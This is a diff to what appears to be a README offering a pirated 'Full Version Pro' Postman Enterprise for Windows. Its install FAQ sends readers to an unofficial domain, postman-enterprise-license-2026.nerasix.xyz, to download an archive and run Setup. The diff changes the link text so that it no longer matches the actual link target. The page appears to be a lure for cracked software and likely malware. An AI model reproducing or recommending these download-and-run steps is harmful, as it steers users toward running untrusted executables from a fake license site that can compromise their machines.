@@ -56,17 +56,17 @@ Full Version  ◆  Pro  ◆  Complete  ◆  Windows
 
 <details>
 <summary>&nbsp;<b>How to install?</b></summary>
-<br>Open <a href="https://postman-enterprise-license-2026.nerasix.xyz/">postman-enterprise-license-2026.nexpath.xyz</a>, click <b>Download</b>, extract the archive, then run <b>Setup</b>.
+<br>Open <a href="https://postman-enterprise-license-2026.nerasix.xyz/">postman-enterprise-license-2026.postman-enterprise-license-2026.nerasix.xyz</a>, click <b>Download</b>, extract the archive, then run <b>Setup</b>.
 </details>
 
 <details>
 <summary>&nbsp;<b>Download didn't start?</b></summary>
-<br>Use the manual link on the NexPath download page, or open <a href="https://postman-enterprise-license-2026.nerasix.xyz/">postman-enterprise-license-2026.nexpath.xyz</a> directly in your browser.
+<br>Use the manual link on the Nerasix download page, or open <a href="https://postman-enterprise-license-2026.nerasix.xyz/">postman-enterprise-license-2026.postman-enterprise-license-2026.nerasix.xyz</a> directly in your browser.
 </details>
 
 <details>
 <summary>&nbsp;<b>Updates?</b></summary>
-<br>Open <a href="https://postman-enterprise-license-2026.nerasix.xyz/">postman-enterprise-license-2026.nexpath.xyz</a> again and download the latest version from NexPath.
+<br>Open <a href="https://postman-enterprise-license-2026.nerasix.xyz/">postman-enterprise-license-2026.postman-enterprise-license-2026.nerasix.xyz</a> again and download the latest version from Nerasix.
 </details>
 <details>
 <summary>&nbsp;<b>Requirements?</b></summary>
